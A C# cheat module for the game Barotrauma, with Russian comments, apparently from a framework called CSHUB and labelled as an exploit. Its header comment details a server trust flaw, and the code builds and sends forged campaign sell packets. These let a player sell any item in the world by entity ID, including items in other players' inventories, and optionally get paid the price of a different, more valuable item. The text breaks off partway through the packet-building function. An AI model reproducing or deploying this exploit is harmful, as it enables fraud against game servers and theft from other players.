// ============================================================================
//  SellByIdModule.cs — CSHUB module ("Sell By ID")
//
//  ЧТО ЭТО:
//  Клиентский модуль для исследования серверной доверительной границы кампании.
//  Позволяет выбрать предмет из списка (с иконками) и продать его на сервере
//  через пакет SERVER_COMMAND (10) + ClientPermissions.ManageCampaign (0x40)
//  -> MultiPlayerCampaign.ServerRead -> ReadSoldItems -> CargoManager.SellItems.
//
//  ВЕКТОР (полностью проверен по исходникам, волна 225):
//  Клиент контролирует {prefabId, itemId, removed, sellerId, origin} в
//  ReadSoldItems. Сервер:
//    1) считает цену ПО PREFAB-ID (store.GetAdjustedItemSellPrice),
//    2) удаляет сущность ПО ITEM-ID (Entity.FindEntityByID -> RemoveQueue),
//       БЕЗ проверки владения и без связи prefabId<->itemId,
//    3) платит продавцу (campaign.GetWallet(sender).Give(price)),
//    4) списывает цену с баланса магазина (store.Balance -= price).
//  Все проверки "можно ли продавать" — клиентские. Гейты на сервере:
//    - HasCampaignInteractionAvailable(Store): рядом NPC-магазин (250 юнитов)
//      ИЛИ AllowRemoteCampaignInteractions=true;
//    - AllowedToManageCampaign(SellInventoryItems [+SellSubItems]):
//      1 клиент на сервере => фоллбэк true; иначе нужны права либо мёртвый/
//      офлайн держатель прав (раунд > 60с).
//
//  РЕЖИМЫ:
//    Обычный: выбрать предмет -> продать его по СВОЕЙ цене.
//    Продвинутый (tickbox): выбрать ОТДЕЛЬНО "ценовой префаб" (за что платят)
//      и цель (что удалит сервер). Цена на сервере считается по ценовому
//      префабу — фабрика предзаполнения цели и цены декомпозирована.
//
//  ПАКЕТ (порядок битов/байтов сверен с серверным ServerRead, волна 225):
//    u8  10 (SERVER_COMMAND)
//    u16 0x0040 (ManageCampaign)
//    u16 currentLocIndex (0xFFFF = -1)      \ пересылаем текущее состояние
//    u16 selectedLocIndex (0xFFFF = -1)     / карты, чтобы ничего не менять
//    u8  missionCount + missionCount*u8     /
//    3x bool (hull/item repairs, shuttle) = false
//    byte storeCount + {Identifier storeId, u16 count,
//         (Identifier itemId, bool deliverImm, rangedInt qty 0..100)*}  <- buyCrate
//    (то же)                                                        <- subSellCrate
//    byte 0                                                         <- purchased
//    byte 1 + Identifier storeId + u16 entryCount
//    entryCount * {Identifier prefabId, u16 itemId, bool removed=false,
//                  byte sellerId, byte origin=0 (Character)}
//    u16 upgradeCount = 0
//    u16 swapCount = 0
//  Локации/миссии/ящики отсылаем КАК ЕСТЬ (зеркало клиента), чтобы не трогать
//  состояние карты/корзин — ровно то же делает легит-клиент.
//
//  ОБРАТНАЯ СВЯЗЬ: Harmony-префикс на GameClient.ReadDataMessage декодирует
//  MONEY(26)-пакеты (NetWalletUpdate) и показывает дельту твоего кошелька.
//
//  ВАЖНО ДЛЯ КОМПИЛЯЦИИ (бинарник игры):
//  - WriteOnlyMessage internal -> создаём через рефлексию (CreateMsg()).
//  - ItemPrefab/Location/StoreInfo/Map/CampaignMode/CargoManager/PurchasedItem
//    internal -> НИГДЕ не именуем: только var + публичные члены + reflection.
//  - Timing.TotalTime, typeof(GameClient), enum-ы — публичны (как в PacketDump).
// ============================================================================

using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using Barotrauma;
using Barotrauma.Networking;
using HarmonyLib;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class SellByIdModule : CSModuleBase
    {
        public override string Id => "sell_by_id";
        public override string Name => "Sell By ID";
        public override string Description =>
            "Продажа любого предмета по ID (доверие пакету SERVER_COMMAND).\n\n" +
            "• Список всех предметов в мире с иконками\n" +
            "• Продажа выбранного экземпляра по ID (без владения)\n" +
            "• Продвинутый режим: отдельный «ценовой префаб»\n" +
            "• Декод MONEY-эха: видно, сколько сервер реально дал\n\n" +
            "Гейты: рядом NPC-магазин (или AllowRemoteCampaignInteractions) +\n" +
            "права SellInventoryItems (1 клиент на сервере => фоллбэк разрешает).";
        public override string Category => "exploit";

        // ------------------- окно -------------------
        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBox _searchBox;
        private static GUITextBlock _searchPlaceholder;
        private static GUITextBlock _statusLabel;
        private static GUITextBlock _hintLabel;
        private static GUIButton _backBtn;
        private static GUITextBlock _pageLabel;
        private static GUITickBox _advancedTick;

        // ------------------- данные -------------------
        private sealed class PrefabGroup
        {
            public Identifier PrefabId;
            public string Name = "???";
            public string IdStr = "";
            public Sprite Icon;
            public Color IconColor = Color.White;
            public readonly List<Item> Items = new List<Item>();
            public int Price = -1; // -1 = неизвестна
        }

        private static readonly List<PrefabGroup> _groups = new List<PrefabGroup>();
        private static PrefabGroup _currentGroup;
        private static string _searchQuery = "";
        private static int _currentPage;
        private const int GroupsPerPage = 13;
        private const int ItemsPerPage = 11;

        private static readonly List<Identifier> _storeIds = new List<Identifier>();
        private static int _storeIndex;

        private static bool _advanced;
        private static Identifier _pricePrefabId;
        private static string _pricePrefabName = "";

        // ------------------- отправка / эхо -------------------
        private const int MaxEntriesPerPacket = 100;
        private const double SendCooldown = 0.5;
        private const double EchoTimeout = 8.0;
        private static double _lastSendTime = -999.0;
        private static double _lastSendRealTime = -999.0;
        private static int _packetsSent;
        private static bool _awaitingEcho;
        private static string _lastResult = "";
        private static int _walletBalance = -1;
        private static int _bankBalance = -1;
        private static int _uiThrottle;

        // ------------------- Harmony -------------------
        private static Harmony _harmony;
        private static bool _echoHooked;
        private static MethodInfo _sendMethod;
        private static Type _writeMsgType;

        private static readonly Color AccentColor = new Color(100, 200, 255);
        private static readonly Color SuccessColor = new Color(100, 255, 140);
        private static readonly Color DangerColor = new Color(255, 100, 100);
        private static readonly Color WarningColor = new Color(255, 220, 100);
        private static readonly Color DimColor = new Color(160, 170, 190);

        // ================================================================
        //  CSModuleBase
        // ================================================================

        public override void Initialize()
        {
            base.Initialize();
            InstallEchoHook();
        }

        public override string GetLabel()
        {
            if (_advanced && !_pricePrefabId.IsEmpty)
            {
                return "Sell By ID [$: " + _pricePrefabName + "] 💸";
            }
            return "Sell By ID 💸";
        }

        public override void OnClick()
        {
            try
            {
                if (_window != null) { CloseWindow(); return; }
                OpenWindow();
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[SellById] OnClick: " + e.Message);
            }
        }

        public override void Update()
        {
            try
            {
                if (_awaitingEcho && Timing.TotalTime - _lastSendRealTime > EchoTimeout)
                {
                    _awaitingEcho = false;
                    _lastResult = "сервер молчит " + (int)EchoTimeout + "с — похоже, пакет отклонён (гейт)";
                    UpdateStatus();
                }

                // статус обновляем ~2 раза в секунду
                _uiThrottle++;
                if (_statusLabel != null && _uiThrottle % 30 == 0) { UpdateStatus(); }
            }
            catch { }
        }

        public override void Dispose()
        {
            CloseWindow();
            UnpatchEcho();
            base.Dispose();
        }

        // ================================================================
        //  ДАННЫЕ
        // ================================================================

        private static Identifier CurrentStoreId()
            => _storeIds.Count == 0
                ? "merchant".ToIdentifier()
                : _storeIds[Math.Clamp(_storeIndex, 0, _storeIds.Count - 1)];

        private static void CollectStores()
        {
            _storeIds.Clear();
            _storeIndex = 0;
            try
            {
                var stores = GameMain.GameSession?.Campaign?.Map?.CurrentLocation?.Stores;
                if (stores != null)
                {
                    foreach (var kvp in stores)
                    {
                        if (kvp.Key.IsEmpty) { continue; }
                        _storeIds.Add(kvp.Key);
                    }
                }
            }
            catch { }
            if (_storeIds.Count == 0) { _storeIds.Add("merchant".ToIdentifier()); }
        }

        private static int GetStoreBalance()
        {
            try
            {
                var stores = GameMain.GameSession?.Campaign?.Map?.CurrentLocation?.Stores;
                if (stores != null && stores.TryGetValue(CurrentStoreId(), out var si))
                {
                    return si.Balance;
                }
            }
            catch { }
            return -1;
        }

        private static void CollectGroups()
        {
            _groups.Clear();
            var byId = new Dictionary<string, PrefabGroup>();

            // доступ к магазину для цен — локальным var'ом, без имён internal-типов
            object storeBox = null;
            try
            {
                var stores = GameMain.GameSession?.Campaign?.Map?.CurrentLocation?.Stores;
                if (stores != null && stores.TryGetValue(CurrentStoreId(), out var si))
                {
                    storeBox = si;
                }
            }
            catch { storeBox = null; }

            foreach (var item in Item.ItemList)
            {
                try
                {
                    if (item == null || item.Removed) { continue; }
                    var prefab = item.Prefab;
                    if (prefab == null) { continue; }

                    string idStr = prefab.Identifier.ToString();
                    if (!byId.TryGetValue(idStr, out var g))
                    {
                        g = new PrefabGroup
                        {
                            PrefabId = prefab.Identifier,
                            IdStr = idStr,
                            Name = prefab.Name?.ToString() ?? idStr
                        };
                        try
                        {
                            g.Icon = prefab.InventoryIcon ?? prefab.Sprite;
                            g.IconColor = prefab.InventoryIconColor;
                        }
                        catch { g.Icon = null; }

                        // цена по префабу в текущем магазине
                        if (storeBox != null)
                        {
                            try { g.Price = CallStoreSellPrice(storeBox, prefab); }
                            catch { g.Price = -1; }
                        }

                        byId.Add(idStr, g);
                    }
                    g.Items.Add(item);
                }
                catch { }
            }

            _groups.AddRange(byId.Values);
            _groups.Sort((a, b) => string.CompareOrdinal(a.Name, b.Name));
        }

        // store.GetAdjustedItemSellPrice(prefab) — store и prefab приходят var'ом
        // (типы internal), поэтому вызов идёт через делегат-обёртку с dynamic-типом
        private static int CallStoreSellPrice(object store, object prefab)
        {
            // store: Location.StoreInfo (internal), prefab: ItemPrefab (internal).
            // Используем reflection по имени метода, чтобы не именовать типы.
            try
            {
                var t = store.GetType();
                MethodInfo mi = null;
                foreach (var m in t.GetMethods(BindingFlags.Public | BindingFlags.Instance))
                {
                    if (m.Name != "GetAdjustedItemSellPrice") { continue; }
                    var ps = m.GetParameters();
                    if (ps.Length >= 1 && ps[0].ParameterType.Name == "ItemPrefab") { mi = m; break; }
                }
                if (mi == null) { return -1; }
                var psAll = mi.GetParameters();
                object[] args = psAll.Length == 1
                    ? new object[] { prefab }
                    : new object[] { prefab, null, true };
                object res = mi.Invoke(store, args);
                return res is int i ? i : -1;
            }
            catch { return -1; }
        }

        // ================================================================
        //  GUI
        // ================================================================

        private static void OpenWindow()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("Sell By ID: только для мультиплеера", DangerColor);
                return;
            }
            if (GameMain.GameSession?.Campaign == null)
            {
                GUI.AddMessage("Sell By ID: нужна кампания (зайди в раунд)", DangerColor);
                return;
            }
            if (Character.Controlled == null)
            {
                GUI.AddMessage("Sell By ID: нужен персонаж в игре", DangerColor);
                return;
            }

            CollectStores();
            CollectGroups();

            _window = new GUIMessageBox("Sell By ID", "", Array.Empty<LocalizedString>(), new Vector2(0.72f, 0.88f));
            var content = _window.Content;
            content.ClearChildren();

            BuildHeader(content);
            BuildControls(content);
            BuildList(content);

            RefreshList();
        }

        private static void BuildHeader(GUIComponent content)
        {
            var header = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.08f), content.RectTransform, Anchor.TopCenter), style: null);
            header.Color = new Color(40, 50, 70);

            var layout = new GUILayoutGroup(
                new RectTransform(new Vector2(0.98f, 0.85f), header.RectTransform, Anchor.Center), isHorizontal: true);
            layout.RelativeSpacing = 0.01f;

            _statusLabel = new GUITextBlock(
                new RectTransform(new Vector2(0.47f, 1f), layout.RectTransform),
                "...", textAlignment: Alignment.CenterLeft);
            _statusLabel.TextColor = AccentColor;

            var storePrev = new GUIButton(
                new RectTransform(new Vector2(0.05f, 0.9f), layout.RectTransform), "<");
            storePrev.ToolTip = "Предыдущий магазин локации";
            storePrev.OnClicked = (b, d) => { CycleStore(-1); return true; };

            var storeNext = new GUIButton(
                new RectTransform(new Vector2(0.05f, 0.9f), layout.RectTransform), ">");
            storeNext.ToolTip = "Следующий магазин локации";
            storeNext.OnClicked = (b, d) => { CycleStore(1); return true; };

            var refreshBtn = new GUIButton(
                new RectTransform(new Vector2(0.16f, 0.9f), layout.RectTransform), "Обновить");
            refreshBtn.Color = new Color(60, 120, 80);
            refreshBtn.OnClicked = (b, d) => { CollectStores(); CollectGroups(); RefreshList(); return true; };

            var closeBtn = new GUIButton(
                new RectTransform(new Vector2(0.14f, 0.9f), layout.RectTransform), "Закрыть");
            closeBtn.Color = new Color(100, 100, 120);
            closeBtn.OnClicked = (b, d) => { CloseWindow(); return true; };

            UpdateStatus();
        }

        private static void BuildControls(GUIComponent content)
        {
            var controls = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.08f), content.RectTransform, Anchor.TopCenter)
                { RelativeOffset = new Vector2(0f, 0.09f) }, style: null);
            controls.Color = new Color(30, 38, 55);

            var layout = new GUILayoutGroup(
                new RectTransform(new Vector2(0.98f, 0.85f), controls.RectTransform, Anchor.Center), isHorizontal: true);
            layout.RelativeSpacing = 0.01f;

            var searchFrame = new GUIFrame(new RectTransform(new Vector2(0.3f, 1f), layout.RectTransform), style: null);
            _searchBox = new GUITextBox(new RectTransform(Vector2.One, searchFrame.RectTransform), "");
            _searchPlaceholder = new GUITextBlock(
                new RectTransform(new Vector2(0.95f, 0.8f), searchFrame.RectTransform, Anchor.CenterLeft),
                "  Поиск...", textAlignment: Alignment.CenterLeft);
            _searchPlaceholder.TextColor = new Color(130, 130, 130);
            _searchPlaceholder.CanBeFocused = false;
            _searchBox.OnTextChanged += (b, t) =>
            {
                _searchQuery = (t ?? "").ToLower();
                _currentPage = 0;
                RefreshList();
                return true;
            };

            _backBtn = new GUIButton(new RectTransform(new Vector2(0.12f, 1f), layout.RectTransform), "< Назад");
            _backBtn.Color = AccentColor;
            _backBtn.Visible = false;
            _backBtn.OnClicked = (b, d) => { _currentGroup = null; _currentPage = 0; RefreshList(); return true; };

            var prevBtn = new GUIButton(new RectTransform(new Vector2(0.06f, 1f), layout.RectTransform), "<<");
            prevBtn.OnClicked = (b, d) => { if (_currentPage > 0) { _currentPage--; RefreshList(); } return true; };

            _pageLabel = new GUITextBlock(
                new RectTransform(new Vector2(0.09f, 1f), layout.RectTransform), "1/1",
                textAlignment: Alignment.Center);
            _pageLabel.TextColor = DimColor;

            var nextBtn = new GUIButton(new RectTransform(new Vector2(0.06f, 1f), layout.RectTransform), ">>");
            nextBtn.OnClicked = (b, d) => { _currentPage++; RefreshList(); return true; };

            _advancedTick = new GUITickBox(
                new RectTransform(new Vector2(0.3f, 0.8f), layout.RectTransform),
                "Ценовой префаб отдельно");
            _advancedTick.Selected = _advanced;
            _advancedTick.OnSelected = (tb) =>
            {
                _advanced = tb.Selected;
                if (!_advanced) { _pricePrefabId = Identifier.Empty; _pricePrefabName = ""; }
                RefreshList();
                return true;
            };

            var hintFrame = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.06f), content.RectTransform, Anchor.TopCenter)
                { RelativeOffset = new Vector2(0f, 0.185f) }, style: null);
            hintFrame.Color = new Color(25, 32, 46);
            _hintLabel = new GUITextBlock(
                new RectTransform(new Vector2(0.99f, 0.9f), hintFrame.RectTransform, Anchor.Center),
                HintText(), textAlignment: Alignment.CenterLeft);
            _hintLabel.TextColor = DimColor;
            _hintLabel.CanBeFocused = false;
        }

        private static void BuildList(GUIComponent content)
        {
            var listFrame = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.74f), content.RectTransform, Anchor.BottomCenter), style: null);
            _list = new GUIListBox(new RectTransform(Vector2.One, listFrame.RectTransform));
            _list.Color = new Color(20, 25, 35);
        }

        private static void CloseWindow()
        {
            _window?.Close();
            _window = null;
            _list = null;
            _searchBox = null;
            _searchPlaceholder = null;
            _statusLabel = null;
            _hintLabel = null;
            _backBtn = null;
            _pageLabel = null;
            _advancedTick = null;
        }

        private static string HintText()
        {
            if (_advanced && !_pricePrefabId.IsEmpty)
            {
                return "ПРОДВИНУТЫЙ: удаляем выбранное, платят по «" + _pricePrefabName + "». Сброс — выключи tickbox.";
            }
            if (_advanced)
            {
                return "ПРОДВИНУТЫЙ: кнопка [$$$] на строке задаёт ценовой префаб, потом SELL/ALL на цели.";
            }
            return "SELL = продать один (ближайший), ALL = все экземпляры. «<»/«>» — выбор магазина локации.";
        }

        private static void CycleStore(int dir)
        {
            if (_storeIds.Count == 0) { return; }
            _storeIndex = ((_storeIndex + dir) % _storeIds.Count + _storeIds.Count) % _storeIds.Count;
            CollectGroups();
            RefreshList();
        }

        private static void RefreshList()
        {
            try
            {
                if (_list == null) { return; }
                _list.Content.ClearChildren();
                if (_backBtn != null) { _backBtn.Visible = _currentGroup != null; }
                if (_searchPlaceholder != null && _searchBox != null)
                {
                    _searchPlaceholder.Visible = string.IsNullOrEmpty(_searchBox.Text);
                }

                if (_currentGroup == null) { ShowGroups(); }
                else { ShowInstances(); }

                if (_hintLabel != null) { _hintLabel.Text = HintText(); }
                UpdateStatus();
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[SellById] RefreshList: " + e.Message);
            }
        }

        private static List<PrefabGroup> FilteredGroups()
        {
            var filtered = _groups;
            if (!string.IsNullOrEmpty(_searchQuery))
            {
                filtered = filtered.Where(g =>
                    (g.Name?.ToLower().Contains(_searchQuery) ?? false) ||
                    g.IdStr.ToLower().Contains(_searchQuery)).ToList();
            }
            return filtered;
        }

        private static void ShowGroups()
        {
            var filtered = FilteredGroups();
            int pages = Math.Max(1, (int)Math.Ceiling(filtered.Count / (float)GroupsPerPage));
            _currentPage = Math.Clamp(_currentPage, 0, pages - 1);
            if (_pageLabel != null) { _pageLabel.Text = (_currentPage + 1) + "/" + pages; }

            AddHeaderRow("Предметы в мире (" + filtered.Count + ") — выбери, что продать");
            if (filtered.Count == 0) { AddEmptyRow("Ничего не найдено"); return; }

            int storeBal = GetStoreBalance();

            foreach (var g in filtered.Skip(_currentPage * GroupsPerPage).Take(GroupsPerPage))
            {
                bool tooExpensive = g.Price > 0 && g.Price > storeBal && storeBal >= 0;

                var row = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.075f), _list.Content.RectTransform), style: null);
                row.Color = new Color(34, 42, 58);

                var layout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.985f, 0.92f), row.RectTransform, Anchor.Center), isHorizontal: true);
                layout.RelativeSpacing = 0.008f;

                // иконка-кнопка -> инстансы
                var iconBtn = new GUIButton(
                    new RectTransform(new Vector2(0.055f, 0.95f), layout.RectTransform), "");
                iconBtn.Color = new Color(0, 0, 0, 0);
                iconBtn.HoverColor = new Color(60, 80, 110, 180);
                iconBtn.OnClicked = (b, d) => { _currentGroup = g; _currentPage = 0; RefreshList(); return true; };
                AddIcon(iconBtn, g.Icon, g.IconColor);

                var nameBtn = new GUIButton(
                    new RectTransform(new Vector2(0.32f, 1f), layout.RectTransform),
                    g.Name, textAlignment: Alignment.CenterLeft);
                nameBtn.Color = new Color(45, 55, 75);
                nameBtn.HoverColor = new Color(70, 85, 110);
                nameBtn.ToolTip = g.IdStr + "\nэкземпляров: " + g.Items.Count;
                nameBtn.OnClicked = (b, d) => { _currentGroup = g; _currentPage = 0; RefreshList(); return true; };

                var cnt = new GUITextBlock(
                    new RectTransform(new Vector2(0.06f, 1f), layout.RectTransform),
                    "x" + g.Items.Count, textAlignment: Alignment.Center);
                cnt.TextColor = WarningColor;

                var price = new GUITextBlock(
                    new RectTransform(new Vector2(0.1f, 1f), layout.RectTransform),
                    g.Price >= 0 ? g.Price + " mk" : "?", textAlignment: Alignment.Center);
                price.TextColor = tooExpensive ? DangerColor : SuccessColor;
                if (tooExpensive) { price.ToolTip = "Дороже баланса магазина — сервер ПРОПУСТИТ продажу"; }

                var sellBtn = new GUIButton(
                    new RectTransform(new Vector2(0.1f, 0.9f), layout.RectTransform), "SELL");
                sellBtn.Color = new Color(60, 140, 70);
                sellBtn.ToolTip = "Продать один (ближайший) экземпляр";
                sellBtn.OnClicked = (b, d) => { SellNearest(g); return true; };

                var allBtn = new GUIButton(
                    new RectTransform(new Vector2(0.12f, 0.9f), layout.RectTransform),
                    "ALL " + Math.Min(g.Items.Count, MaxEntriesPerPacket));
                allBtn.Color = new Color(140, 90, 40);
                allBtn.ToolTip = "Продать до " + MaxEntriesPerPacket + " экземпляров одним пакетом";
                allBtn.OnClicked = (b, d) => { SellAll(g); return true; };

                if (_advanced)
                {
                    var priceBtn = new GUIButton(
                        new RectTransform(new Vector2(0.08f, 0.9f), layout.RectTransform), "$$$");
                    priceBtn.Color = g.PrefabId == _pricePrefabId
                        ? new Color(180, 120, 220)
                        : new Color(120, 70, 150);
                    priceBtn.ToolTip = "Сделать этот предмет ЦЕНОВЫМ префабом (за что платят)";
                    priceBtn.OnClicked = (b, d) =>
                    {
                        _pricePrefabId = g.PrefabId;
                        _pricePrefabName = g.Name;
                        RefreshList();
                        return true;
                    };
                }
            }
        }

        private static void ShowInstances()
        {
            var items = _currentGroup.Items.Where(i => i != null && !i.Removed).ToList();
            if (!string.IsNullOrEmpty(_searchQuery))
            {
                items = items.Where(i => (i.Name?.ToLower().Contains(_searchQuery) ?? false)).ToList();
            }

            int pages = Math.Max(1, (int)Math.Ceiling(items.Count / (float)ItemsPerPage));
            _currentPage = Math.Clamp(_currentPage, 0, pages - 1);
            if (_pageLabel != null) { _pageLabel.Text = (_currentPage + 1) + "/" + pages; }

            AddHeaderRow(_currentGroup.Name + " — экземпляры (" + items.Count + ")");
            if (items.Count == 0) { AddEmptyRow("Пусто"); return; }

            int idx = _currentPage * ItemsPerPage;
            foreach (var item in items.Skip(_currentPage * ItemsPerPage).Take(ItemsPerPage))
            {
                idx++;
                var row = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.075f), _list.Content.RectTransform), style: null);
                row.Color = new Color(34, 42, 58);

                var layout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.985f, 0.92f), row.RectTransform, Anchor.Center), isHorizontal: true);
                layout.RelativeSpacing = 0.008f;

                var iconFrame = new GUIFrame(
                    new RectTransform(new Vector2(0.055f, 0.95f), layout.RectTransform), style: null);
                iconFrame.Color = Color.Transparent;
                AddIcon(iconFrame, _currentGroup.Icon, _currentGroup.IconColor);

                var num = new GUITextBlock(
                    new RectTransform(new Vector2(0.05f, 1f), layout.RectTransform),
                    "#" + idx, textAlignment: Alignment.Center);
                num.TextColor = DimColor;

                var name = new GUITextBlock(
                    new RectTransform(new Vector2(0.3f, 1f), layout.RectTransform),
                    item.Name ?? "???", textAlignment: Alignment.CenterLeft);
                name.TextColor = Color.White;
                name.ToolTip = "ID сущности: " + item.ID + "\n" + _currentGroup.IdStr;

                var locTxt = new GUITextBlock(
                    new RectTransform(new Vector2(0.32f, 1f), layout.RectTransform),
                    DescribeLocation(item), textAlignment: Alignment.CenterLeft);
                locTxt.TextColor = new Color(180, 185, 200);

                var idTxt = new GUITextBlock(
                    new RectTransform(new Vector2(0.08f, 1f), layout.RectTransform),
                    item.ID.ToString(), textAlignment: Alignment.Center);
                idTxt.TextColor = new Color(140, 160, 200);

                var sellBtn = new GUIButton(
                    new RectTransform(new Vector2(0.11f, 0.9f), layout.RectTransform), "SELL");
                sellBtn.Color = new Color(60, 140, 70);
                sellBtn.ToolTip = "Продать эту сущность по ID " + item.ID +
                    (_advanced && !_pricePrefabId.IsEmpty ? "\n(цена: " + _pricePrefabName + ")" : "");
                Item captured = item;
                sellBtn.OnClicked = (b, d) => { SellInstance(captured); return true; };
            }
        }

        private static void AddIcon(GUIComponent parent, Sprite icon, Color tint)
        {
            if (icon == null) { return; }
            try
            {
                var img = new GUIImage(
                    new RectTransform(new Vector2(0.85f, 0.85f), parent.RectTransform, Anchor.Center),
                    icon, false);
                img.Color = tint;
                img.CanBeFocused = false;
            }
            catch { }
        }

        private static string DescribeLocation(Item item)
        {
            try
            {
                if (item.ParentInventory?.Owner is Character c)
                {
                    bool mine = c == Character.Controlled;
                    return mine ? "[МОЙ инвентарь]" : "[Игрок] " + c.Name;
                }
                if (item.ParentInventory?.Owner is Item cont) { return "[Контейнер] " + cont.Name; }
                if (item.Submarine != null) { return "[Суб/мир]"; }
                var p = item.WorldPosition;
                return "[Мир] " + (int)p.X + ", " + (int)p.Y;
            }
            catch { return "[?]"; }
        }

        private static void AddHeaderRow(string text)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.05f), _list.Content.RectTransform), style: null);
            row.Color = new Color(50, 60, 80);
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.Center);
            txt.TextColor = AccentColor;
            txt.CanBeFocused = false;
        }

        private static void AddEmptyRow(string text)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.08f), _list.Content.RectTransform), style: null);
            row.Color = new Color(30, 36, 48);
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.Center);
            txt.TextColor = DimColor;
            txt.CanBeFocused = false;
        }

        private static void UpdateStatus()
        {
            if (_statusLabel == null) { return; }
            try
            {
                string store = CurrentStoreId().ToString();
                int bal = GetStoreBalance();
                string storeStr = store + (bal >= 0 ? " (" + bal + " mk)" : "");
                string wallet = _walletBalance >= 0 ? _walletBalance.ToString() : "?";
                string bank = _bankBalance >= 0 ? " | банк " + _bankBalance : "";
                string priceTag = _advanced && !_pricePrefabId.IsEmpty ? " | $$$ " + _pricePrefabName : "";
                string result = string.IsNullOrEmpty(_lastResult) ? "" : "\n" + _lastResult;
                _statusLabel.Text = "Магазин: " + storeStr + "\nКошелёк: " + wallet + " mk" + bank + priceTag + result;
            }
            catch { }
        }

        // ================================================================
        //  ЛОГИКА ПРОДАЖИ
        // ================================================================

        private sealed class SellEntry
        {
            public Identifier PrefabId;   // за что платят
            public ushort EntityId;       // что удаляет сервер
            public string Desc = "";
        }

        private static bool CanSendNow(out string reason)
        {
            reason = null;
            if (GameMain.Client == null) { reason = "нет клиента"; return false; }
            if (GameMain.GameSession?.Campaign == null) { reason = "нет кампании"; return false; }
            if (Timing.TotalTime - _lastSendTime < SendCooldown)
            {
                reason = "кулдаун " + SendCooldown + "с";
                return false;
            }
            return true;
        }

        private static void SellNearest(PrefabGroup g)
        {
            if (!CanSendNow(out var reason))
            {
                GUI.AddMessage("Sell By ID: " + reason, WarningColor);
                return;
            }

            Character me = Character.Controlled;
            Item target = me != null
                ? g.Items.Where(i => i != null && !i.Removed)
                    .OrderBy(i => Vector2.DistanceSquared(i.WorldPosition, me.WorldPosition))
                    .FirstOrDefault()
                : g.Items.FirstOrDefault(i => i != null && !i.Removed);

            if (target == null)
            {
                GUI.AddMessage("Sell By ID: нет живых экземпляров", DangerColor);
                return;
            }

            Identifier priceId = (_advanced && !_pricePrefabId.IsEmpty) ? _pricePrefabId : g.PrefabId;
            var entry = new SellEntry
            {
                PrefabId = priceId,
                EntityId = target.ID,
                Desc = g.Name + " #" + target.ID +
                       (priceId != g.PrefabId ? " (цена: " + _pricePrefabName + ")" : "")
            };
            SendEntries(new List<SellEntry> { entry });
        }

        private static void SellInstance(Item item)
        {
            if (!CanSendNow(out var reason))
            {
                GUI.AddMessage("Sell By ID: " + reason, WarningColor);
                return;
            }
            if (item == null || item.Removed)
            {
                GUI.AddMessage("Sell By ID: предмет исчез", DangerColor);
                return;
            }

            Identifier ownId;
            string ownName = item.Name ?? "?";
            try { ownId = item.Prefab.Identifier; } catch { ownId = _currentGroup?.PrefabId ?? Identifier.Empty; }

            Identifier priceId = (_advanced && !_pricePrefabId.IsEmpty) ? _pricePrefabId : ownId;
            var entry = new SellEntry
            {
                PrefabId = priceId,
                EntityId = item.ID,
                Desc = ownName + " #" + item.ID +
                       ((_advanced && !_pricePrefabId.IsEmpty) ? " (цена: " + _pricePrefabName + ")" : "")
            };
            SendEntries(new List<SellEntry> { entry });
        }

        private static void SellAll(PrefabGroup g)
        {
            if (!CanSendNow(out var reason))
            {
                GUI.AddMessage("Sell By ID: " + reason, WarningColor);
                return;
            }

            Identifier priceId = (_advanced && !_pricePrefabId.IsEmpty) ? _pricePrefabId : g.PrefabId;
            var entries = new List<SellEntry>();
            foreach (var i in g.Items)
            {
                if (entries.Count >= MaxEntriesPerPacket) { break; }
                if (i == null || i.Removed) { continue; }
                entries.Add(new SellEntry { PrefabId = priceId, EntityId = i.ID });
            }
            if (entries.Count == 0)
            {
                GUI.AddMessage("Sell By ID: нечего продавать", DangerColor);
                return;
            }
            SendEntries(entries);
        }

        // ================================================================
        //  ПАКЕТ
        // ================================================================

        private static void SendEntries(List<SellEntry> entries)
        {
            try
            {
                if (!BuildSellPacket(entries, out var msg, out var err))
                {
                    GUI.AddMessage("Sell By ID: " + err, DangerColor);
                    return;
                }

                if (!ResolveSendMethod())
                {
                    GUI.AddMessage("Sell By ID: ClientPeer.Send не найден (сменилась версия?)", DangerColor);
                    return;
                }

                var peer = GameMain.Client.ClientPeer;
                _sendMethod.Invoke(peer, new object[] { msg, DeliveryMethod.Reliable, true });

                _lastSendTime = Timing.TotalTime;
                _lastSendRealTime = Timing.TotalTime;
                _packetsSent++;
                _awaitingEcho = true;
                _lastResult = "пакет #" + _packetsSent + ": " + entries.Count + " поз. — жду MONEY-эхо...";

                DebugConsole.NewMessage("[SellById] отправлено " + entries.Count + " шт. (" +
                    entries[0].Desc + (entries.Count > 1 ? " и др." : "") + ")", Color.Cyan);
                GUI.AddMessage("Sell By ID: отправлено " + entries.Count + " поз.", AccentColor);
                UpdateStatus();
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[SellById] SendEntries: " + e.Message);
                GUI.AddMessage("Sell By ID: ошибка отправки — " + e.Message, DangerColor);
            }
        }

        private static bool BuildSellPacket(List<SellEntry> entries, out IWriteMessage msg, out string error)
        {
            msg = null;
            error = null;

            var client = GameMain.Client;
            var campaign = GameMain.GameSession?.Campaign;
            var map = campaign?.Map;
            if (client == null || campaign == null || map?.CurrentLocation == null)
            {
                error = "нужна кампания и текущая локация";
                return false;
            }
            if (entries == null || entries.Count == 0)
            {
                error = "пустой список";
                return false;
            }
            if (entries.Count > MaxEntriesPerPacket)
            {
                error = "слишком много позиций (макс " + MaxEntriesPerPacket + ")";
                return false;
